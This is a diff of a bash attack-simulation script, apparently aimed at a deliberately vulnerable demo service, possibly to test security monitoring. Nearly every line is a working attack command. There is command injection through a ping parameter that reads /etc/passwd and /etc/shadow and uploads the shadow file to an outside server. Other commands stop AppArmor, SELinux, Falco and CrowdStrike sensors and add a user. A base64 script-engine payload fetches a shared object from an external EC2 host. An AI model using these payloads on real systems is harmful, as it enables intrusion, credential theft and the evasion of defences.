@@ -163,7 +163,7 @@ performModifyBashRCFile() {
 }
 
 performDownloadOfMaliciousSharedObject() {
-  curl 'http://'"$host"':8081/test?name=test&cac=dmFyIFJ1bnRpbWUgPSBKYXZhLnR5cGUoJ2phdmEubGFuZy5SdW50aW1lJyk7ClJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoWydjdXJsJywgJy1vJywgJy90bXAvcGUuc28nLCAnaHR0cDovL2xvZzRzaGVsbC1zZXJ2aWNlOjgxODAvcGUuc28nXSkud2FpdEZvcigpOwo='
+  curl 'http://'"$host"':8081/test?name=test&cac=dmFyIFJ1bnRpbWUgPSBKYXZhLnR5cGUoJ2phdmEubGFuZy5SdW50aW1lJyk7ClJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoWydjdXJsJywgJy1vJywgJy90bXAvcGUuc28nLCAnaHR0cDovL2xvZzRzaGVsbC1zZXJ2aWNlOjgxODAvcGUuc28nXSkud2FpdEZvcigpOwpSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKFsnY3VybCcsICctbycsICcvdG1wL3BlLnNvJywgJ2h0dHA6Ly9lYzItMy0yMi0xOTQtMTU1LnVzLWVhc3QtMi5jb21wdXRlLmFtYXpvbmF3cy5jb206ODE4MC9wZS5zbyddKS53YWl0Rm9yKCk7'
   sleep 15
   #read
   curl -v 'http://'"$host"':8081/faq.html'
@@ -184,30 +184,30 @@ performPortScan() {
 }
 
 performCommandInjectionCatEtcPasswd() {
-  curl 'http://'"$host"':8081/cmd?arg=cat%20%2Fetc%2Fpasswd%0A'
+  curl 'http://'"$host"':8081/ping?ip=localhost%20;%20cat%20/etc/passwd'
 }
 
 performCommandInjectionCatEtcShadow() {
-  curl 'http://'"$host"':8081/cmd?arg=cat%20%2Fetc%2Fshadow%0A'
+  curl 'http://'"$host"':8081/ping?ip=localhost%20;%20cat%20/etc/shadow'
 }
 
 performCommandInjectionDownloadSharedObject() {
-  curl 'http://'"$host"':8081/cmd?arg=curl%20-o%20/tmp/pe.so%20http://'"$jndiserver"':8180/pe.so'
+  curl 'http://'"$host"':8081/ping?ip=localhost%20;%20curl%20-o%20/tmp/pe.so%20http://'"$jndiserver"':8180/pe.so'
 }
 
 performCommandInjectionUploadShadowFile() {
-  curl 'http://'"$host"':8081/cmd?arg=curl%20-X%20POST%20-F%20%22file=@/etc/shadow%22%20http://'"$jndiserver"':8180/upload'
+  curl 'http://'"$host"':8081/ping?ip=localhost%20;%20curl%20-X%20POST%20-F%20%22file=@/etc/shadow%22%20http://'"$jndiserver"':8180/upload'
 }
 
 performCommandInjectionShutDownSecurityTooling() {
-  curl 'http://'"$host"':8081/cmd?arg=service%20apparmor%20stop%0A'
-  curl 'http://'"$host"':8081/cmd?arg=echo%200%20%3E%20/selinux/enforce'
-  curl 'http://'"$host"':8081/cmd?arg=systemctl%20stop%20falco'
-  curl 'http://'"$host"':8081/cmd?arg=systemctl%20stop%20falcon-sensor'
+  curl 'http://'"$host"':8081/ping?ip=localhost%20;%20service%20apparmor%20stop%0A'
+  curl 'http://'"$host"':8081/ping?ip=localhost%20;%20echo%200%20%3E%20/selinux/enforce'
+  curl 'http://'"$host"':8081/ping?ip=localhost%20;%20systemctl%20stop%20falco'
+  curl 'http://'"$host"':8081/ping?ip=localhost%20;%20systemctl%20stop%20falcon-sensor'
 }
 
 performCommandInjectionAddUser() {
-  curl 'http://'"$host"':8081/cmd?arg=useradd%20newuser'
+  curl 'http://'"$host"':8081/ping?ip=localhost%20;%20useradd%20newuser'
 }
 
 performDeserializationAttack() {
